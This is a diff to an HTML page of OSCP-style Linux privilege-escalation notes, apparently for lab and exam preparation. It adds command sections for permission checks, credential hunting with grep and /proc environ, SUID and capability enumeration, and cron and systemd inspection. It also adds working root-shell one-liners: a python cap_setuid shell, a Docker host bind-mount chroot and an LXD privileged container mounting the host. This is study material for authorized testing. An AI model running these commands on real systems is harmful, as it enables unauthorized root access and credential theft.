@@ -332,6 +332,7 @@ ip addr; ip route
 <a id="s-10-6-18-1"></a><a id="s-10-9-18-1" data-legacy-anchor="s-10-6-18-1"></a><h3 id="escalate-privileges-on-linux">10.9.18.1 Escalate privileges on Linux</h3>
 <details>
 <summary id="variant-10-6-18-1-1">10.9.18.1.1 Find: Establish Linux state and choose an escalation candidate</summary>
+<p><a id="surface-linux-state"></a></p>
 <p>At a new shell collect effective IDs/groups, current mounts, root-owned activity and exact sudo rules before choosing a technique.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">id
 findmnt
@@ -347,6 +348,7 @@ sudo -l
 </details>
 <details>
 <summary id="variant-10-6-18-1-2">10.9.18.1.2 Find: Prove effective file, directory, ACL and mount control</summary>
+<p><a id="surface-linux-permissions"></a></p>
 <p>From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">namei -l /PATH/TO/OBJECT
 getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT
@@ -358,9 +360,32 @@ findmnt -T /PATH/TO/OBJECT
 <p><strong>Validate next:</strong> Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-permissions">Prove effective file, directory, ACL and mount control</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-3">10.9.18.1.3 Commands and use-case variants</summary>
+<blockquote>
+<p><strong><span class="reference-cue cue-condition">Need:</span></strong> A verified Linux foothold with a known effective UID, groups and filesystem context. Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately</p>
+</blockquote>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">namei -l /PATH/TO/OBJECT
+stat /PATH/TO/OBJECT /PATH/TO/PARENT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
+findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS
+</code></pre></div><div class="command-reading"><blockquote>
+<p>Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. <code>nosuid</code> defeats SUID/SGID and file-capability effects; <code>noexec</code> blocks direct execution; <code>ro</code> blocks changes.</p>
+</blockquote></div></div>
+<p>Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under <code>/etc</code>, <code>/opt</code>, <code>/usr/local</code>, application paths and service working directories:</p>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">find / -xdev -type f -writable -ls 2>/dev/null
+find / -xdev -type d -writable -ls 2>/dev/null
+</code></pre></div><div class="command-reading"><blockquote>
+<p><strong>Verify:</strong> Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain.</p>
+</blockquote></div></div>
+<blockquote>
+<p><strong>If it fails:</strong> A read-only/noexec/nosuid mount changes which effects are possible. Find another consumer rather than assuming every permission bypasses mount policy.</p>
+</blockquote>
+</details>
 </details>
 <details>
-<summary id="variant-10-6-18-1-3">10.9.18.1.3 Find: Recover credentials from Linux user, service and process trails</summary>
+<summary id="variant-10-6-18-1-4">10.9.18.1.4 Find: Recover credentials from Linux user, service and process trails</summary>
+<p><a id="surface-linux-secrets"></a></p>
 <p>Follow observed application processes and directories into readable configuration, history and environment; prioritize paths tied to actual services.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">ps auxww
 history
@@ -372,9 +397,55 @@ find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null
 <p><strong>Validate next:</strong> Read the named config/history/process artifact and record the user, service and host it belongs to. Classify a recovered password/key, test one matching service context and verify the accepted identity before trying reuse elsewhere.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-secrets">Recover credentials from Linux user, service and process trails</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-5">10.9.18.1.5 Commands and use-case variants</summary>
+<blockquote>
+<p><strong><span class="reference-cue cue-condition">Need:</span></strong> A verified Linux foothold with a known effective UID, groups and filesystem context. Read access to the artifact; exact account/service context; session/agent access must include a usable live identity</p>
+</blockquote>
+<pre><code class="language-bash">history 2>/dev/null
+find /home /root -maxdepth 3 -type f \
+  \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
+     -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \
+  -readable 2>/dev/null
+
+grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \
+  /var/www /opt /srv /etc 2>/dev/null | head -n 200
+</code></pre>
+<p>Inspect process arguments and readable process environment:</p>
+<pre><code class="language-bash">ps auxww
+ps eww -u root 2>/dev/null
+tr '\0' ' ' &#x3C; /proc/PID/cmdline 2>/dev/null; echo
+tr '\0' '\n' &#x3C; /proc/PID/environ 2>/dev/null
+</code></pre>
+<p>Check reusable local sessions/agents only when their sockets are accessible:</p>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">w; who; last -n 20
+env | grep -E 'SSH_AUTH_SOCK|TMUX|STY'
+tmux ls 2>/dev/null
+screen -ls 2>/dev/null
+find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
+</code></pre></div><div class="command-reading"><blockquote>
+<p>An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking.</p>
+</blockquote></div></div>
+<blockquote>
+<p><strong>Next:</strong> identify the value's user/service context, validate the smallest relevant transition (<code>su</code>, <code>sudo</code>, SSH or application <a href="/oscp/notes/ad-investigation/glossary/#term-authentication" title="Establishing an identity through a protocol. Success does not automatically permit a share read, remote logon or execution." class="glossary-term">authentication</a>), then re-enumerate. Use <a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">credential handling</a> for cracking/reuse.</p>
+</blockquote>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">find /home /var/www /opt /srv -type f \
+  \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \
+     -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null
+
+rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \
+  /var/www /opt /srv 2>/dev/null
+</code></pre></div><div class="command-reading"><blockquote>
+<p><strong>Verify:</strong> Record source, exact material type and validated identity/service; keep real secrets in private lab records.</p>
+</blockquote></div></div>
+<blockquote>
+<p><strong>If it fails:</strong> Stale examples and unrelated tokens are common. A denied process read is a visibility limit, not evidence that no credentials exist elsewhere.</p>
+</blockquote>
+</details>
 </details>
 <details>
-<summary id="variant-10-6-18-1-4">10.9.18.1.4 Find: Use an allowed sudo operation to cross a privilege boundary</summary>
+<summary id="variant-10-6-18-1-6">10.9.18.1.6 Find: Use an allowed sudo operation to cross a privilege boundary</summary>
+<p><a id="surface-linux-sudo"></a></p>
 <p>Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">sudo -n -l 2>&#x26;1
 sudo -l
@@ -387,7 +458,8 @@ sudo -l
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-sudo">Use an allowed sudo operation to cross a privilege boundary</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-5">10.9.18.1.5 Find: Load a controlled library through a permitted sudo environment</summary>
+<summary id="variant-10-6-18-1-7">10.9.18.1.7 Find: Load a controlled library through a permitted sudo environment</summary>
+<p><a id="surface-linux-preload"></a></p>
 <p>Inspect sudo's environment-related tags/defaults and the exact allowed executable's dynamic-linking evidence.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">sudo -l
 file /ALLOWED/PROGRAM
@@ -401,7 +473,8 @@ readelf -l /ALLOWED/PROGRAM
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-preload">Load a controlled library through a permitted sudo environment</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-6">10.9.18.1.6 Find: Use a SUID or SGID program's exposed privileged primitive</summary>
+<summary id="variant-10-6-18-1-8">10.9.18.1.8 Find: Use a SUID or SGID program's exposed privileged primitive</summary>
+<p><a id="surface-linux-suid"></a></p>
 <p>Inventory privileged-mode files, then focus on custom/nonstandard programs and inspect ownership, mount and documented behavior.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
 find / -xdev -type f -perm -2000 -ls 2>/dev/null
@@ -413,9 +486,50 @@ file /PATH/TO/BINARY
 <p><strong>Validate next:</strong> Run stat on the flagged executable and findmnt -T on its path. Check the SUID owner, nosuid and exact binary behavior; after a permitted operation run id to see whether the elevated effective UID was retained.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-suid">Use a SUID or SGID program's exposed privileged primitive</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-9">10.9.18.1.9 Commands and use-case variants</summary>
+<blockquote>
+<p><strong><span class="reference-cue cue-condition">Need:</span></strong> A verified Linux foothold with a known effective UID, groups and filesystem context. Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege</p>
+</blockquote>
+<pre><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -xdev -type f -perm -2000 -ls 2>/dev/null
+getcap -r / 2>/dev/null
+</code></pre>
+<p>Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate:</p>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">namei -l /PATH/TO/BINARY
+stat /PATH/TO/BINARY
+file /PATH/TO/BINARY
+readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /PATH/TO/BINARY 2>/dev/null
+strings /PATH/TO/BINARY | head -n 150
+dpkg -S /PATH/TO/BINARY 2>/dev/null
+rpm -qf /PATH/TO/BINARY 2>/dev/null
+</code></pre></div><div class="command-reading"><blockquote>
+<p>Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.</p>
+</blockquote></div></div>
+<details>
+<summary id="variant-10-6-18-1-10">10.9.18.1.10 Capability interpretation and example</summary>
+<p>High-value capability candidates include <code>cap_setuid</code>, <code>cap_setgid</code>, <code>cap_dac_override</code>, <code>cap_dac_read_search</code>, <code>cap_sys_ptrace</code>, <code>cap_sys_admin</code>, <code>cap_setfcap</code> and <code>cap_sys_module</code>. <code>cap_net_raw</code> is usually not a direct root transition.</p>
+<pre><code class="language-bash">capsh --print 2>/dev/null
+grep '^Cap' /proc/self/status
+</code></pre>
+<p>Only when the exact interpreter has effective <code>cap_setuid</code>:</p>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">/PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+</code></pre></div><div class="command-reading"><blockquote>
+<p><code>+ep</code> indicates permitted plus the file effective bit. Bounding sets, namespaces, <code>nosuid</code> mounts and program behavior can still change the result.</p>
+</blockquote></div></div>
+</details>
+<blockquote>
+<p><strong>Verify:</strong> Verify effective IDs and the exact privileged operation; a real UID or prompt label alone is insufficient.</p>
+</blockquote>
+<blockquote>
+<p><strong>If it fails:</strong> nosuid, privilege dropping, fixed arguments or MAC policy can invalidate a candidate. Distinguish a file-read primitive from arbitrary execution.</p>
+</blockquote>
+</details>
 </details>
 <details>
-<summary id="variant-10-6-18-1-7">10.9.18.1.7 Find: Use a file capability that enables a specific privileged operation</summary>
+<summary id="variant-10-6-18-1-11">10.9.18.1.11 Find: Use a file capability that enables a specific privileged operation</summary>
+<p><a id="surface-linux-capabilities"></a></p>
 <p>Search file capabilities and inspect the exact program plus current namespace/bounding context.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">getcap -r / 2>/dev/null
 capsh --print 2>/dev/null
@@ -428,7 +542,8 @@ capsh --print 2>/dev/null
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-capabilities">Use a file capability that enables a specific privileged operation</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-8">10.9.18.1.8 Find: Control a script, binary or configuration consumed by a privileged job/service</summary>
+<summary id="variant-10-6-18-1-12">10.9.18.1.12 Find: Control a script, binary or configuration consumed by a privileged job/service</summary>
+<p><a id="surface-linux-jobs"></a></p>
 <p>Inspect actual cron/systemd definitions and running processes, then follow their action paths into permission checks.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">cat /etc/crontab
 systemctl list-timers --all
@@ -440,9 +555,47 @@ ps auxww
 <p><strong>Validate next:</strong> Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-jobs">Control a script, binary or configuration consumed by a privileged job/service</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-13">10.9.18.1.13 Commands and use-case variants</summary>
+<blockquote>
+<p><strong><span class="reference-cue cue-condition">Need:</span></strong> A verified Linux foothold with a known effective UID, groups and filesystem context. Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger</p>
+</blockquote>
+<pre><code class="language-bash">crontab -l 2>/dev/null
+cat /etc/crontab
+cat /etc/anacrontab 2>/dev/null
+atq 2>/dev/null
+ls -la /etc/cron.* /var/spool/cron 2>/dev/null
+grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100
+
+systemctl list-timers --all
+systemctl list-unit-files --type=service
+systemctl list-units --type=service --state=running
+systemctl cat UNIT
+systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles
+</code></pre>
+<p>Observe short-lived commands:</p>
+<pre><code class="language-bash">./pspy64
+./pspy64 -pf -i 1000
+</code></pre>
+<p>Validate every referenced script, binary, configuration, environment file, plugin and parent:</p>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">namei -l /PATH/TO/OBJECT
+stat /PATH/TO/OBJECT /PATH/TO/PARENT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
+</code></pre></div><div class="command-reading"><blockquote>
+<p><strong>Prove:</strong> exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment.</p>
+</blockquote></div></div>
+<p>Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input.</p>
+<blockquote>
+<p><strong>Verify:</strong> Verify the consumer's resulting effect and identity; editing a file without an observed trigger is incomplete.</p>
+</blockquote>
+<blockquote>
+<p><strong>If it fails:</strong> Wrong path, service sandbox, missing trigger or another effective identity breaks the chain. Use process observation and permission checks.</p>
+</blockquote>
+</details>
 </details>
 <details>
-<summary id="variant-10-6-18-1-9">10.9.18.1.9 Find: Hijack an unqualified helper through controlled PATH resolution</summary>
+<summary id="variant-10-6-18-1-14">10.9.18.1.14 Find: Hijack an unqualified helper through controlled PATH resolution</summary>
+<p><a id="surface-linux-path"></a></p>
 <p>Inspect a verified privileged helper/script for unqualified executable names and compare its actual PATH with writable directories.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">printf '%s\n' "$PATH"
 namei -l /PATH/TO/CANDIDATE_DIRECTORY
@@ -456,7 +609,8 @@ strings /PATH/TO/REVIEWED_BINARY
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-path">Hijack an unqualified helper through controlled PATH resolution</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-10">10.9.18.1.10 Find: Turn wildcard-expanded filenames into privileged command options</summary>
+<summary id="variant-10-6-18-1-15">10.9.18.1.15 Find: Turn wildcard-expanded filenames into privileged command options</summary>
+<p><a id="surface-linux-wildcard"></a></p>
 <p>Read the exact privileged command line and inspect the directory over which its shell glob expands.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">cat /PATH/TO/REVIEWED_JOB_SCRIPT
 ls -la /PATH/TO/JOB_DIRECTORY
@@ -470,12 +624,13 @@ namei -l /PATH/TO/JOB_DIRECTORY
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-wildcard">Turn wildcard-expanded filenames into privileged command options</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-11">10.9.18.1.11 Find: Change a writable account or privilege-policy file</summary>
+<summary id="variant-10-6-18-1-16">10.9.18.1.16 Find: Change a writable account or privilege-policy file</summary>
+<p><a id="surface-linux-policy"></a></p>
 <p>Check permissions on the account/policy file identified by enumeration, including parents and mount state, before any content change.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">stat /etc/passwd /etc/shadow /etc/sudoers
 getfacl -p /etc/passwd /etc/sudoers 2>/dev/null
 </code></pre></div><div class="command-reading"><blockquote>
-<p><strong>Recognize:</strong> A sensitive account file appears writable; the <a href="/oscp/notes/ad-investigation/glossary/#term-authentication" title="Establishing an identity through a protocol. Success does not automatically permit a share read, remote logon or execution." class="glossary-term">authentication</a> implementation and valid record syntax determine its effect.</p>
+<p><strong>Recognize:</strong> A sensitive account file appears writable; the authentication implementation and valid record syntax determine its effect.</p>
 </blockquote></div></div>
 <blockquote>
 <p><strong>Validate next:</strong> Preserve original state; confirm exact effective write, file consumer, useful identity and recovery/trigger.</p>
@@ -483,7 +638,8 @@ getfacl -p /etc/passwd /etc/sudoers 2>/dev/null
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-policy">Change a writable account or privilege-policy file</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-12">10.9.18.1.12 Find: Use privileged group, daemon or container-management control</summary>
+<summary id="variant-10-6-18-1-17">10.9.18.1.17 Find: Use privileged group, daemon or container-management control</summary>
+<p><a id="surface-linux-containers"></a></p>
 <p>Inspect groups, local sockets and namespace context, then use only permitted read-only daemon inventory to identify rootful/rootless behavior.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">id
 ls -l /var/run/docker.sock
@@ -495,9 +651,47 @@ cat /proc/1/cgroup
 <p><strong>Validate next:</strong> Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-containers">Use privileged group, daemon or container-management control</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-18">10.9.18.1.18 Commands and use-case variants</summary>
+<blockquote>
+<p><strong><span class="reference-cue cue-condition">Need:</span></strong> A verified Linux foothold with a known effective UID, groups and filesystem context. Effective daemon/API permission, correct rootful/rootless or privileged mode, available resources and a host-affecting operation</p>
+</blockquote>
+<pre><code class="language-bash">id
+ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
+docker version 2>/dev/null
+lxc list 2>/dev/null
+</code></pre>
+<p>Group candidates include <code>docker</code>, <code>lxd</code>/<code>lxc</code>, <code>disk</code>, <code>shadow</code>, <code>adm</code>, <code>systemd-journal</code> and <code>libvirt</code>. Prove the associated resource and <a href="/oscp/notes/ad-investigation/glossary/#term-effective-right" title="The operation actually allowed after the current trustee memberships, allow/deny rules, scope, inheritance and object-specific restrictions are considered." class="glossary-term">effective permission</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-19">10.9.18.1.19 Rootful Docker daemon with an available image</summary>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">docker images
+docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh
+</code></pre></div><div class="command-reading"><blockquote>
+<p>Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.</p>
+</blockquote></div></div>
 </details>
 <details>
-<summary id="variant-10-6-18-1-13">10.9.18.1.13 Find: Exploit a permission-backed mount, NFS mapping or local service</summary>
+<summary id="variant-10-6-18-1-20">10.9.18.1.20 LXD/LXC with an available image alias</summary>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">lxc image list
+lxc init IMAGE_ALIAS privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+</code></pre></div><div class="command-reading"><blockquote>
+<p>Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.</p>
+</blockquote></div></div>
+</details>
+<blockquote>
+<p><strong>Verify:</strong> Distinguish host and container namespace, effective UID and the exact host operation.</p>
+</blockquote>
+<blockquote>
+<p><strong>If it fails:</strong> Rootless mode, user namespaces, policy or absent images can change the route. Do not equate a container prompt with host compromise.</p>
+</blockquote>
+</details>
+</details>
+<details>
+<summary id="variant-10-6-18-1-21">10.9.18.1.21 Find: Exploit a permission-backed mount, NFS mapping or local service</summary>
+<p><a id="surface-linux-mounts"></a></p>
 <p>Inspect mounts, exports and local listeners after the foothold; correlate each with its identity and reachable service.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">findmnt
 cat /etc/exports 2>/dev/null
@@ -511,7 +705,8 @@ ss -lntup
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-mounts">Exploit a permission-backed mount, NFS mapping or local service</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-14">10.9.18.1.14 Find: Control a privileged program's shared-library resolution</summary>
+<summary id="variant-10-6-18-1-22">10.9.18.1.22 Find: Control a privileged program's shared-library resolution</summary>
+<p><a id="surface-linux-library"></a></p>
 <p>Inspect the reviewed privileged executable's dependencies/search paths and permission-check the actual selected library directory.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">readelf -d /PATH/TO/BINARY
 namei -l /PATH/TO/LIBRARY_DIRECTORY
@@ -524,7 +719,8 @@ namei -l /PATH/TO/LIBRARY_DIRECTORY
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-library">Control a privileged program's shared-library resolution</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-15">10.9.18.1.15 Find: Select an evidence-matched Linux software or kernel exploit</summary>
+<summary id="variant-10-6-18-1-23">10.9.18.1.23 Find: Select an evidence-matched Linux software or kernel exploit</summary>
+<p><a id="surface-linux-kernel"></a></p>
 <p>Collect distribution build/package/architecture and the required local feature before comparing a specific advisory/PoC.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">uname -a
 cat /etc/os-release
@@ -538,7 +734,8 @@ getconf LONG_BIT
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-kernel">Select an evidence-matched Linux software or kernel exploit</a>.</p>
 </details>
 <details>
-<summary id="variant-10-6-18-1-16">10.9.18.1.16 Find: Use enumeration tools to generate manually testable candidates</summary>
+<summary id="variant-10-6-18-1-24">10.9.18.1.24 Find: Use enumeration tools to generate manually testable candidates</summary>
+<p><a id="surface-linux-enumerators"></a></p>
 <p>Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence.</p>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">id
 uname -m
@@ -551,4 +748,31 @@ ls -ld /tmp
 <p><strong>Validate next:</strong> Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check.</p>
 </blockquote>
 <p><a href="/oscp/notes/methods/linux-privesc/#linux-enumerators">Use enumeration tools to generate manually testable candidates</a>.</p>
+<details>
+<summary id="variant-10-6-18-1-25">10.9.18.1.25 Commands and use-case variants</summary>
+<blockquote>
+<p><strong><span class="reference-cue cue-condition">Need:</span></strong> A verified Linux foothold with a known effective UID, groups and filesystem context. Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location</p>
+</blockquote>
+<p>For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit:</p>
+<pre><code class="language-bash">sh ./linpeas.sh | tee linpeas.txt
+</code></pre>
+<p>Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline.</p>
+<div class="command-pair"><div class="command-action"><pre><code class="language-bash">./linpeas.sh | tee linpeas.txt
+./lse.sh | tee lse.txt
+./lse.sh -l1 | tee lse-l1.txt
+./unix-privesc-check standard > unix-privesc-check.txt
+</code></pre></div><div class="command-reading"><blockquote>
+<p>LinPEAS optional flags vary by build. Read the local <code>./linpeas.sh -h</code> before selecting broader checks; they are not the automatic baseline. LSE progresses from default to <code>-l1</code>, then <code>-l2</code> only if needed. <code>unix-privesc-check detailed</code> is slower and more false-positive-prone.</p>
+</blockquote></div></div>
+<p>For every highlight:</p>
+<pre><code class="language-text">exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification
+</code></pre>
+<p>Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate.</p>
+<blockquote>
+<p><strong>Verify:</strong> Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding</p>
+</blockquote>
+<blockquote>
+<p><strong>If it fails:</strong> Script blocked or output empty: check the shell, transfer integrity and output path, then use the native checks for the observed rule/file/job. Empty collector output does not rule out escalation</p>
+</blockquote>
+</details>
 </details></details></article><section class="deeper"><strong>Understand the mechanism</strong><p><a href="/oscp/notes/methods/linux-privesc/">Study methods</a> · <a href="/oscp/reference/05-local-privilege-escalation/">Complete procedures</a> · <a href="/oscp/notes/Master_Notes/">Master Notes</a></p></section></main><aside id="page-index"><p class="eyebrow">IN THIS TOPIC</p><nav aria-label="On this page"><a href="#early-tool-assisted-pass">1 Find escalation candidates with an initial tool-assisted survey</a><a href="#candidate-proof">2 Verify the conditions that make an escalation path usable</a><a href="#first-pass">3 Find promising paths from your current access</a><a href="#prove-effective-permissions">4 Verify your effective access to the resource the attack depends on</a><a href="#credentials-and-files">5 Find credentials you can use for another identity</a><a href="#sudo">6 Check whether your sudo rights enable higher privileges</a><a href="#suid--sgid--capabilities">7 Find privileged executables you can use</a><a href="#cron-timers-services-and-short-lived-processes">8 Find privileged execution that consumes something you control</a><a href="#path-hijacking">9 Check whether you can redirect a privileged command lookup</a><a href="#wildcard-option-injection">10 Check whether controlled filenames become privileged command options</a><a href="#writable-account-and-policy-files">11 Check whether writable account or policy files enable higher privileges</a><a href="#groups-sockets-and-containers">12 Check whether group or socket access gives you higher privileges</a><a href="#mounts-nfs-local-services-and-libraries">13 Find escalation paths through mounts and local services</a><a href="#softwarekernel-candidates--last">14 Assess matching software or kernel exploits after permission checks</a><a href="#automated-candidate-generation">15 Investigate remaining gaps with a focused automated survey</a><a href="#failure-quick-map">16 Choose the next check from the failure you observed</a><a href="#verify-and-re-enumerate">17 Verify and re-enumerate</a><a href="#discover-and-recognize-candidates">18 Discover and recognize candidates</a></nav></aside></body></html><script type="module" src="/_assets/linux.astro_astro_type_script_index_0_lang.uZg4ZVYA.js"></script>
